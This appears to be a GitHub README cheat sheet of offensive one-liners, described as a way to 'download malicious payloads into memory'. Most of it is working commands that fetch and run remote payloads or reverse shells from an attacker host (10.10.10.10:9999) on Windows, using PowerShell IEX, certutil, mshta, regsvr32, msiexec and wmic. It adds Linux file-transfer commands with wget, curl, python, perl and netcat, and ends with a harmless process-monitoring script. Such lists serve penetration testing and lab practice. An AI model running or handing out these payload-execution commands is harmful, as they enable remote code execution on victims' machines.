# One-Liners-Handy-Scripts
Simple One-Liners to download malicious payloads into memory & handy scripts 


Windows One-Liners to Download Remote Payloads:

Powershell:
```
powershell "IEX( IWR http://10.10.10.10:9999 -UseBasicParsing)"

powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:9999/test.bat'))
```

Certutil:
```
certutil -urlcache -f http://10.10.10.10:9999/shell.exe shell.exe
```

Mshta:
```
mshta http://10.10.10.10:9999/rev.hta
mshta vbscript:Close(Execute("GetObject(""script:http://10.10.10.10:9999/rev.sct"")"))
```

Regsvr32:
```
regsvr32 /s /n /u /i:http://10.10.10.10:9999/rev.sct scrobj.dll
```

Msiexec:
```
msiexec /q /i http://10.10.10.10:9999/rev.msi
```

Wmic:
```
wmic os get /FORMAT:"http://10.10.10.10:9999/rev.xsl"
```

File Transfers (Linux)

Wget:
```
wget http://10.10.10.10:9999/file.sh -O /tmp/file.sh
```
Curl:
```
curl http://10.10.10.10:9999/file.sh -o /tmp/file.sh
```
Python
```
python -c "import urllib; f = urllib.URLopener(); f.retrieve('http://10.10.10.10:9999/rev.exe', '/tmp/rev.exe');"
```
Perl
```
perl -e 'use File::Fetch; my $ff=File::Fetch->new(uri => "http://10.10.10.10:9999/rev.sh"); my $file = $ff->fetch() or die $ff->error;'
```
Netcat:
```
Victim: nc -l -p 4444 > file.sh
Attacker: nc -w 3 10.10.10.20 4444 < input.file
```
Handy Scripts:

Monitor processes in real-time *Thanx to Ippsec 
```
#!/bin/bash

IFS=$'\n'
old_process=$(ps -eo command)

while true; do
  new_process=$(ps -eo command)
  diff <(echo "$old_process") <(echo "$new_process") |grep [\<\>]
  sleep 1
  old_process=$new_process
done
```
In-Progress
